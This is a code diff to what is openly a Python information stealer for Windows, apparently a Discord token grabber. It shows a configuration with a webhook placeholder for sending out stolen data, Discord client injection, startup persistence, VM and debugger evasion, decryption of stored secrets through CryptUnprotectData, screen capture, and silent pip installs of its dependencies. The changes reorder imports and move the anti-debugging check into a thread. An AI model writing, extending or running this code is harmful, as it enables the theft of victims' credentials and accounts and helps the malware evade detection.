@@ -19,6 +19,7 @@ import winreg, random
 from base64 import b64decode
 import os.path, zipfile
 import shutil, json, sqlite3
+from win32crypt import CryptUnprotectData
 import tempfile, datetime
 ### CONFIG ### 
 webhook = '%Webhook%' #Put your webhook
@@ -30,21 +31,6 @@ Startup = '%Startup%' # If True, adds the file to the startup folder
 antidebugging = '%No_Debug%' # # If False, does not check for VM or debugger
 DiscordStop = '%Close%' # If True, prevents Discord from being launched again by removing content from the startup file. Note: this will disable injection.
 StartupMessage = 'Error while adding Trap into the startup folder' # DONT TOUCH / The message displayed if Startup is set to True
-
-requirements = [
-    ["requests", "requests"],
-    ["Crypto.Cipher", "pycryptodome"],
-    ["win32clipboard", "pywin32"],
-    ["pypiwin32","pypiwin32"]
-]
-
-for modl in requirements:
-    try:
-        dist = pkg_resources.get_distribution(modl[1])
-    except pkg_resources.DistributionNotFound:
-        subprocess.call(['pip', 'install', modl[1]])
-from win32crypt import CryptUnprotectData
-
 
 def clear_command_prompt():
     if os.name == 'nt':
@@ -125,17 +111,8 @@ def check_dll():
     if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
         exit_program('Detected Vm')
 
-headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
 
-try:
-    if antidebugging == True:
-        antidebug()
-    else:
-        pass
-except:
-    pass
+
 
 class DATA_BLOB(Structure):
     _fields_ = [
@@ -195,10 +172,29 @@ def webhook_tools():
             time.sleep(1)
     except:
         pass
+headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
 
 file_path = os.path.realpath(__file__)
 USER_NAME = getpass.getuser()
+import importlib
+import subprocess
+import pkg_resources
 
+requirements = [
+    ["requests", "requests"],
+    ["Crypto.Cipher", "pycryptodome"],
+    ["win32clipboard", "pywin32"],
+    ["Pillow", "Pillow"],
+]
+
+for modl in requirements:
+    try:
+        dist = pkg_resources.get_distribution(modl[1])
+    except pkg_resources.DistributionNotFound:
+        subprocess.call(['pip', 'install', modl[1]])
+        
 import requests
 from PIL import ImageGrab
 from ctypes import *
@@ -1375,6 +1371,17 @@ def GatherAll():
     aa = []
     global injection
     global DiscordStop
+    
+    try:
+        if antidebugging == True:
+            ad = threading.Thread(target=antidebug)
+            ad.start()
+            aa.append(ad)
+        else:
+            pass
+    except:
+        pass
+
     if injection == True:
         try:
             ij = threading.Thread(target=inj_discord)
